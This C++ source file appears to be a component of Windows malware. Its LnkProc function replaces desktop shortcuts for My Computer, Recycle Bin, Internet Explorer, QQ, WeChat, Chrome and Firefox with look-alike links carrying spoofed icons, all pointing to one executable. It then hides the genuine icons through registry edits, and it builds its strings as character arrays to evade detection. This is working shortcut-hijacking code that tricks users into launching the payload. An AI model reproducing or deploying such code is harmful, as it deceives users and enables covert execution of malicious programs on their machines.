#include "PublicVar.h"
#include <shlobj.h>
#include "function/DeviceInformation.h"
#include <Shlwapi.h>
//#pragma comment(lib,"shlwapi.lib")
#include "RegEditor.h"



DWORD HideIEOnDesktop()
{
	//"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel\\"
	char szHideDesktopIconsPath[] = { 'S','o','f','t','w','a','r','e','\\','M','i','c','r','o','s','o','f','t',
		'\\','W','i','n','d','o','w','s','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n',
		'\\','E','x','p','l','o','r','e','r','\\','H','i','d','e','D','e','s','k','t','o','p','I','c','o','n','s',
		'\\','N','e','w','S','t','a','r','t','P','a','n','e','l','\\',0 };

	//"{B416D21B-3B22-B6D4-BBD3-BBD452DB3D5B}"
	char szIEPathGUID[] = { '{','B','4','1','6','D','2','1','B','-','3','B','2','2','-','B','6','D','4','-',
		'B','B','D','3','-','B','B','D','4','5','2','D','B','3','D','5','B','}',0 };
	int iRet = __SetRegistryKeyValueDword(HKEY_CURRENT_USER, szHideDesktopIconsPath, szIEPathGUID, TRUE, iCpuBits);

	//RedrawWindow(NULL, NULL, NULL, RDW_ERASE|RDW_INVALIDATE|RDW_ALLCHILDREN);
	lpSHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL);
	//InvalidateRect(NULL, NULL, TRUE);

	return TRUE;
}



//not work on windows 8 and 10
DWORD HideComputerOnDesktop() 
{   
	//"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel\\"
	char szHideDesktopIconsPath[] = {'S','o','f','t','w','a','r','e','\\','M','i','c','r','o','s','o','f','t',
		'\\','W','i','n','d','o','w','s','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n',
		'\\','E','x','p','l','o','r','e','r','\\','H','i','d','e','D','e','s','k','t','o','p','I','c','o','n','s',
		'\\','N','e','w','S','t','a','r','t','P','a','n','e','l','\\',0};

	//{20D04FE0-3AEA-1069-A2D8-08002B30309D}
	char szMycomputerGUID[] = {'{','2','0','D','0','4','F','E','0','-','3','A','E','A','-',
		'1','0','6','9','-','A','2','D','8','-','0','8','0','0','2','B','3','0','3','0','9','D','}',0};
	int iRet = __SetRegistryKeyValueDword(HKEY_CURRENT_USER,szHideDesktopIconsPath,szMycomputerGUID,TRUE,iCpuBits);
	if (iRet == FALSE)
	{
		return FALSE;
	}

	//RedrawWindow(NULL, NULL, NULL, RDW_ERASE|RDW_INVALIDATE|RDW_ALLCHILDREN);
	lpSHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL); 
	//InvalidateRect(NULL, NULL, TRUE);

	// 	HWND  hwndParent = lpFindWindowA( "Progman", "Program Manager" ); 
	// 	HWND  hwndSHELLDLL_DefView = lpFindWindowExA( hwndParent, NULL, "SHELLDLL_DefView", NULL ); 
	// 	HWND  hwndSysListView32 = lpFindWindowExA( hwndSHELLDLL_DefView, NULL, "SysListView32", "FolderView" );
	// 	iRet = lpUpdateWindow(hwndSysListView32);
	//	ListView_RedrawItems(hwndSysListView32, 0, ListView_GetItemCount(hwndSysListView32) - 1);
	return TRUE;
}


//{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}
DWORD HideRecycleOnDesktop() 
{   
	//"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel\\"
	char szHideDesktopIconsPath[] = {'S','o','f','t','w','a','r','e','\\','M','i','c','r','o','s','o','f','t',
		'\\','W','i','n','d','o','w','s','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n',
		'\\','E','x','p','l','o','r','e','r','\\','H','i','d','e','D','e','s','k','t','o','p','I','c','o','n','s',
		'\\','N','e','w','S','t','a','r','t','P','a','n','e','l','\\',0};

	//{645FF040-5081-101B-9F08-00AA002F954E}
	char szMycomputerGUID[] = {'{','6','4','5','F','F','0','4','0','-','5','0','8','1','-','1','0','1','B','-',
		'9','F','0','8','-','0','0','A','A','0','0','2','F','9','5','4','E','}',0};
	int iRet = __SetRegistryKeyValueDword(HKEY_CURRENT_USER,szHideDesktopIconsPath,szMycomputerGUID,TRUE,iCpuBits);
	if (iRet == FALSE)
	{
		return FALSE;
	}

	lpSHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL); 
	return TRUE;
}




DWORD PretendOnDestTop(wchar_t * strCommand,wchar_t * strArguments,wchar_t * strWorkPath,wchar_t * strIcon,wchar_t *strLnkName)
{
	HRESULT bResult = lpCoInitialize(NULL);
	if (bResult == S_OK)
	{
		IShellLink *pShellLink = 0;
		bResult = lpCoCreateInstance (CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,IID_IShellLink, (void **)&pShellLink) >= 0;
		if (bResult)
		{
			IPersistFile *ppf = 0;
			bResult = pShellLink->QueryInterface(IID_IPersistFile, (void **)&ppf) >= 0;
			if (bResult)
			{
				bResult = ppf->Load(strLnkName, TRUE) >= 0;
				if (bResult == FALSE)		//not exist to create it
				{
// 					WIN32_FIND_DATAW stFd = {0};
// 					wchar_t wcQQSrcPath[MAX_PATH] = {0};
// 					bResult = pShellLink->GetPath(wcQQSrcPath,MAX_PATH,&stFd,0);
// 					if (lpStrCmpIW(wcQQSrcPath,strCommand))
// 					{
						bResult = pShellLink->SetPath(strCommand);
						bResult = pShellLink->SetIconLocation(strIcon,0);
						bResult = pShellLink->SetWorkingDirectory(strWorkPath);
						bResult = pShellLink->SetArguments(strArguments);
						bResult = ppf->Save(strLnkName, TRUE) >= 0;
// 					}
// 					else		//find it to quit
// 					{
// 						ppf->Release();
// 						pShellLink->Release();
// 						lpCoUninitialize();
// 						return TRUE;
// 					}
				}
				
				ppf->Release();
			}
			pShellLink->Release();
		}
		lpCoUninitialize();
	}

	return FALSE;
}




// DWORD OpenIE()
// {
// 	LPITEMIDLIST pidl;
// 	LPMALLOC pMalloc;
// 
// 	if ( SUCCEEDED( SHGetSpecialFolderLocation ( NULL, CSIDL_HISTORY, &pidl )))
// 	{
// 		SHELLEXECUTEINFO sei = {0};
// 		//ZeroMemory(&sei, sizeof(sei));
// 		sei.cbSize = sizeof(sei);
// 		sei.fMask = SEE_MASK_IDLIST;
// 		sei.lpIDList = pidl;
// 		sei.lpVerb = L"open";
// 		sei.hwnd = lpGetDesktopWindow();
// 		sei.nShow = SW_SHOWNORMAL; 
// 		int iRet = lpShellExecuteExW(&sei);
// 		if ( SUCCEEDED( SHGetMalloc ( &pMalloc )))
// 		{
// 			pMalloc->Free( pidl );
// 			pMalloc->Release();
// 			return TRUE;
// 		}
// 	} 
// 	return FALSE;
// }



 
DWORD OpenRecycle()
{
	LPITEMIDLIST pidl;
	LPMALLOC pMalloc;

	if ( SUCCEEDED( SHGetSpecialFolderLocation ( NULL, CSIDL_BITBUCKET, &pidl )))
	{
		SHELLEXECUTEINFO sei = {0};
		sei.cbSize = sizeof(sei);
		sei.fMask = SEE_MASK_IDLIST;
		sei.lpIDList = pidl;
		//sei.lpVerb = L"open";
		char szOpen[] = {'o',0,'p',0,'e',0,'n',0,0,0};
		sei.lpVerb = (wchar_t*)szOpen;
		sei.hwnd = lpGetDesktopWindow();
		sei.nShow = SW_SHOWNORMAL; 
		int iRet = lpShellExecuteExW(&sei);
		if ( SUCCEEDED( SHGetMalloc ( &pMalloc )))
		{
			pMalloc->Free( pidl );
			pMalloc->Release();
			return TRUE;
		}
	} 
	return FALSE;
}



DWORD OpenMyComputer()
{
	LPITEMIDLIST pidl;
	LPMALLOC pMalloc;
	if ( SUCCEEDED( SHGetSpecialFolderLocation ( NULL, CSIDL_DRIVES, &pidl )))
	{
		SHELLEXECUTEINFO sei = {0};
		sei.cbSize = sizeof(sei);
		sei.fMask = SEE_MASK_IDLIST;
		sei.lpIDList = pidl;
		//sei.lpVerb = L"open";
		char szOpen[] = {'o',0,'p',0,'e',0,'n',0,0,0};
		sei.lpVerb = (wchar_t*)szOpen;
		sei.hwnd = lpGetDesktopWindow();
		sei.nShow = SW_SHOWNORMAL; 
		int iRet = lpShellExecuteExW(&sei);
		if ( SUCCEEDED( SHGetMalloc ( &pMalloc )))
		{
			pMalloc->Free( pidl );
			pMalloc->Release();
			return TRUE;
		}
	} 
	return FALSE;
}



DWORD __stdcall LnkProc(char * szDstPePath,char * szSysDir,char * strUserName,char * strDataPath)
{
	int iRet = 0;
	wchar_t wszDstPePath[MAX_PATH];
	lpMultiByteToWideChar(CP_ACP, 0, szDstPePath, -1,(LPWSTR)wszDstPePath, MAX_PATH);  

	wchar_t wszWorkPath[MAX_PATH];
	lpMultiByteToWideChar(CP_ACP,0,strDataPath,-1,wszWorkPath,MAX_PATH);

	char strIco[MAX_PATH];
	lplstrcpyA(strIco,strDataPath);
	char szLinkFileName[MAX_PATH];
	if (iSystemVersion <= SYSTEM_VERSION_XP)
	{
		char szComputerFormatWinXP[] = "C:\\Documents and Settings\\%s\\????\\????????.lnk";
		char szMycomputerXPIconName[] = {'c','o','m','p','u','t','e','r','x','p','.','i','c','o',0};
		lplstrcatA(strIco,szMycomputerXPIconName);
		iRet = lpwsprintfA(szLinkFileName,szComputerFormatWinXP,strUserName);
	}
	else if(iSystemVersion >= SYSTEM_VERSION_WIN10)
	{
		char szComputerFormatWin10[] = "C:\\Users\\%s\\Desktop\\??????.lnk";
		char szMycomputerWin10IconName[] = {'c','o','m','p','u','t','e','r','w','i','n','1','0','.','i','c','o',0};
		lplstrcatA(strIco,szMycomputerWin10IconName);
		iRet = lpwsprintfA(szLinkFileName,szComputerFormatWin10,strUserName);	
	}
	else if (iSystemVersion >= SYSTEM_VERSION_WIN8)
	{
		char szComputerFormatWin8[] = "C:\\Users\\%s\\Desktop\\????????.lnk";
		char szMycomputerIconName[] = {'c','o','m','p','u','t','e','r','.','i','c','o',0};
		lplstrcatA(strIco,szMycomputerIconName);
		iRet = lpwsprintfA(szLinkFileName,szComputerFormatWin8,strUserName);
	}
	else
	{
		char szComputerFormatWin7[] = "C:\\Users\\%s\\Desktop\\??????.lnk";
		char szMycomputerIconName[] = {'c','o','m','p','u','t','e','r','.','i','c','o',0};
		lplstrcatA(strIco,szMycomputerIconName);
		iRet = lpwsprintfA(szLinkFileName,szComputerFormatWin7,strUserName);	
	}

	szLinkFileName[0] = szSysDir[0];
	wchar_t wszLnkUnicode[MAX_PATH] = { 0 };
	lpMultiByteToWideChar(CP_ACP, 0, szLinkFileName,  -1, (LPWSTR)wszLnkUnicode, MAX_PATH);  
	wchar_t wszIcoPath[MAX_PATH];
	lpMultiByteToWideChar(CP_ACP,0,strIco,-1,wszIcoPath,MAX_PATH);

	iRet = PretendOnDestTop(wszDstPePath,L"MyComputer",L"",wszIcoPath,wszLnkUnicode);
	if (iRet)
	{
		HideComputerOnDesktop();
	}



	lplstrcpyA(strIco, strDataPath);
	if (iSystemVersion <= SYSTEM_VERSION_XP)
	{
		char szRecycleIcoPathFormatXP[] = "C:\\Documents and Settings\\%s\\????\\??????.lnk";
		iRet = lpwsprintfA(szLinkFileName,szRecycleIcoPathFormatXP,strUserName);
	}
	else if (iSystemVersion >= SYSTEM_VERSION_VISTA && iSystemVersion <= SYSTEM_VERSION_WIN10)
	{
		char szRecycleIcoPathFormatWin7[] = "C:\\Users\\%s\\Desktop\\??????.lnk";
		iRet = lpwsprintfA(szLinkFileName,szRecycleIcoPathFormatWin7,strUserName);
	}

	szLinkFileName[0] = szSysDir[0];
	lpMultiByteToWideChar(CP_ACP, 0, szLinkFileName,  -1, (LPWSTR)wszLnkUnicode, MAX_PATH);  
	
	if (iSystemVersion >= SYSTEM_VERSION_WIN10)
	{
		char szThisIconName[] = {'r','e','c','y','c','l','e','w','i','n','1','0','.','i','c','o',0};
		lplstrcatA(strIco,szThisIconName);
	}
	else
	{
		char szThisIconName[] = {'r','e','c','y','c','l','e','w','i','n','7','.','i','c','o',0};
		lplstrcatA(strIco,szThisIconName);
	}
	lpMultiByteToWideChar(CP_ACP,0,strIco,-1,wszIcoPath,MAX_PATH);
	iRet = PretendOnDestTop(wszDstPePath,L"Recycle",L"",wszIcoPath,wszLnkUnicode);
	if (iRet)
	{
		HideRecycleOnDesktop();
	}

	
	char szIEFormatWin7Win8[] = "C:\\Users\\%s\\Desktop\\Internet Explorer.lnk";
	if (iSystemVersion <= SYSTEM_VERSION_XP)
	{
		char szIEFormatWinXP[] = "C:\\Documents and Settings\\%s\\????\\Internet Explorer.lnk";
		iRet = lpwsprintfA(szLinkFileName,szIEFormatWinXP,strUserName);
	}
	else if (iSystemVersion >= SYSTEM_VERSION_VISTA && iSystemVersion < SYSTEM_VERSION_WIN10)
	{
		
		iRet = lpwsprintfA(szLinkFileName,szIEFormatWin7Win8,strUserName);
	}
	else if (iSystemVersion >= SYSTEM_VERSION_WIN10)
	{
		char szIEFormatWin10[] = "C:\\Users\\%s\\Desktop\\Microsoft Edge.lnk";
		iRet = lpwsprintfA(szLinkFileName,szIEFormatWin7Win8,strUserName);
		//iRet = lpwsprintfA(szLinkFileName,szIEFormatWin10,strUserName);
	}

	szLinkFileName[0] = szSysDir[0];
	lpMultiByteToWideChar(CP_ACP, 0, szLinkFileName,  -1, (LPWSTR)wszLnkUnicode, MAX_PATH);  
	lplstrcpyA(strIco,strDataPath);
	if (iSystemVersion >= SYSTEM_VERSION_WIN10)
	{
		char szIEIconName[] = {'i','e','.','i','c','o',0};
		lplstrcatA(strIco,szIEIconName);
		//char szEdgeIconName[] = {'e','d','g','e','.','i','c','o',0};
		//lplstrcatA(strIco,szEdgeIconName);
	}
	else
	{
		char szIEIconName[] = {'i','e','.','i','c','o',0};
		lplstrcatA(strIco,szIEIconName);
	}
	
	lpMultiByteToWideChar(CP_ACP,0,strIco,-1,wszIcoPath,MAX_PATH);
	iRet = PretendOnDestTop(wszDstPePath,L"IE",L"",wszIcoPath,wszLnkUnicode);
	if (iRet)
	{
		HideIEOnDesktop();
	}

	if (*strQQPath)
	{
		lplstrcpyA(strIco,strDataPath);
		char szQQIconName[] = {'q','q','.','i','c','o',0};
		lplstrcatA(strIco,szQQIconName);
		lpMultiByteToWideChar(CP_ACP,0,strIco,-1,wszIcoPath,MAX_PATH);

		char szQQLnkFormatSelfmake[] = "C:\\Users\\%s\\Desktop\\ ????QQ.lnk";
		char szQQLnkFormatSelfmakeWinXP[] = "C:\\Documents and Settings\\%s\\????\\ ????QQ.lnk";
		if (iSystemVersion >= SYSTEM_VERSION_VISTA)
		{
			iRet = lpwsprintfA(szLinkFileName,szQQLnkFormatSelfmake,strUserName);
		}
		else
		{
			iRet = lpwsprintfA(szLinkFileName,szQQLnkFormatSelfmakeWinXP,strUserName);
		}

		szLinkFileName[0] = szSysDir[0];
		lpMultiByteToWideChar(CP_ACP, 0, szLinkFileName,  - 1, (LPWSTR)wszLnkUnicode, MAX_PATH);  
		iRet = PretendOnDestTop(wszDstPePath,L"QQ",wszWorkPath,wszIcoPath,wszLnkUnicode);
		if (iRet == 0)
		{
			char szQQLnkFormat[] = "C:\\Users\\%s\\Desktop\\????QQ .lnk";
			char szQQLnkFormatWinXP[] = "C:\\Documents and Settings\\%s\\????\\????QQ .lnk";
			if (iSystemVersion >= SYSTEM_VERSION_VISTA)
			{
				iRet = lpwsprintfA(szLinkFileName,szQQLnkFormat,strUserName);
			}
			else
			{
				iRet = lpwsprintfA(szLinkFileName,szQQLnkFormatWinXP,strUserName);
			}

			szLinkFileName[0] = szSysDir[0];
			lpMultiByteToWideChar(CP_ACP, 0, szLinkFileName,  - 1, (LPWSTR)wszLnkUnicode, MAX_PATH);  
			iRet = PretendOnDestTop(wszDstPePath,L"QQ",wszWorkPath,wszIcoPath,wszLnkUnicode);
			if (iRet == 0)
			{

			}
		}
	}

	if (*szWechatPath)
	{
		lplstrcpyA(strIco,strDataPath);
		char szWechatIconName[] = {'w','e','c','h','a','t','.','i','c','o',0};
		lplstrcatA(strIco,szWechatIconName);
		lpMultiByteToWideChar(CP_ACP,0,strIco,-1,wszIcoPath,MAX_PATH);

		char szwxLnkFormat[] = "C:\\Users\\%s\\Desktop\\???? .lnk";
		char szwxLnkFormatWinXP[] = "C:\\Documents and Settings\\%s\\????\\???? .lnk";
		if (iSystemVersion >= SYSTEM_VERSION_VISTA)
		{
			iRet = lpwsprintfA(szLinkFileName,szwxLnkFormat,strUserName);
		}
		else
		{
			iRet = lpwsprintfA(szLinkFileName,szwxLnkFormatWinXP,strUserName);
		}

		szLinkFileName[0] = szSysDir[0];
		lpMultiByteToWideChar(CP_ACP, 0, szLinkFileName,  - 1, (LPWSTR)wszLnkUnicode, MAX_PATH);  
		iRet = PretendOnDestTop(wszDstPePath,L"wechat",wszWorkPath,wszIcoPath,wszLnkUnicode);
		if (iRet == 0)
		{

			char szwxLnkFormatSelfmake[] = "C:\\Users\\%s\\Desktop\\?? ??.lnk";
			char szwxLnkFormatSelfmakeWinXP[] = "C:\\Documents and Settings\\%s\\????\\?? ??.lnk";
			if (iSystemVersion >= SYSTEM_VERSION_VISTA)
			{
				iRet = lpwsprintfA(szLinkFileName,szwxLnkFormatSelfmake,strUserName);
			}
			else
			{
				iRet = lpwsprintfA(szLinkFileName,szwxLnkFormatSelfmakeWinXP,strUserName);
			}

			szLinkFileName[0] = szSysDir[0];
			lpMultiByteToWideChar(CP_ACP, 0, szLinkFileName,  - 1, (LPWSTR)wszLnkUnicode, MAX_PATH);  
			iRet = PretendOnDestTop(wszDstPePath,L"wechat",wszWorkPath,wszIcoPath,wszLnkUnicode);
			if (iRet == 0)
			{

			}
		}
	}

	if (*szChromePath)
	{
		char szChromeFormatAllUser[] = "C:\\Users\\%s\\Desktop\\Google Chrome.lnk";
		char szChromeFormatAllUserWinXP[] = "C:\\Documents and Settings\\%s\\????\\Google Chrome.lnk";
		if (iSystemVersion >= SYSTEM_VERSION_VISTA)
		{
			iRet = lpwsprintfA(szLinkFileName,szChromeFormatAllUser,strUserName);		//"public"
		}
		else
		{
			iRet = lpwsprintfA(szLinkFileName,szChromeFormatAllUserWinXP,strUserName);
		}
		
		lpMultiByteToWideChar(CP_ACP, 0, szLinkFileName,  -1, (LPWSTR)wszLnkUnicode, MAX_PATH);  
		lplstrcpyA(strIco,strDataPath);
		lplstrcatA(strIco,"chrome.ico");
		lpMultiByteToWideChar(CP_ACP,0,strIco,-1,wszIcoPath,MAX_PATH);
		iRet = PretendOnDestTop(wszDstPePath,L"CHROME",wszWorkPath,wszIcoPath,wszLnkUnicode);
		if (iRet == 0)
		{
		}
	}


	if (*szFireFoxPath)
	{
		char szFireFoxFormatAllUser[] = "C:\\Users\\%s\\Desktop\\Mozilla FireFox.lnk";
		char szFireFoxFormatAllUserWinXP[] = "C:\\Documents and Settings\\%s\\????\\Mozilla FireFox.lnk";
		if (iSystemVersion >= SYSTEM_VERSION_VISTA)
		{
			iRet = lpwsprintfA(szLinkFileName,szFireFoxFormatAllUser,strUserName);
		}
		else
		{
			iRet = lpwsprintfA(szLinkFileName,szFireFoxFormatAllUserWinXP,strUserName);
		}
		
		lpMultiByteToWideChar(CP_ACP, 0, szLinkFileName,  -1, (LPWSTR)wszLnkUnicode, MAX_PATH);  

		lplstrcpyA(strIco,strDataPath);
		lplstrcatA(strIco,"firefox.ico");
		lpMultiByteToWideChar(CP_ACP,0,strIco,-1,wszIcoPath,MAX_PATH);
		iRet = PretendOnDestTop(wszDstPePath,L"FIREFOX",L"",wszIcoPath,wszLnkUnicode);
		if (iRet == 0)
		{
		}
	}

	return TRUE;
}

